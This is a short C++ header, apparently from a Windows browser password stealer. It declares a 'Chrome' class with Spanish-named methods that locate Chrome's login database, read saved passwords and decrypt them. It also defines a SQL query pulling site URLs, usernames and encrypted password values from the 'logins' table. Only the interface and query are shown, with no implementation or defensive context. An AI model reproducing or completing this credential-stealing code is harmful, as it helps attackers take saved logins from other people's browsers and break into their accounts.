#include <iostream>
#include <windows.h>
#include <string>
#include <fstream>
#include <shlobj.h>

#include "sqlite3.h"

# define CONSULTA		"SELECT origin_url, username_value, length(password_value), password_value FROM logins"
using namespace std;

#pragma once
class Chrome
{
public:
	Chrome();
	~Chrome();

	char* getRutaBD();
	char* getContraseñas(char* rutaBD);
	const char* descifrarPassword(BYTE* password, int size);
};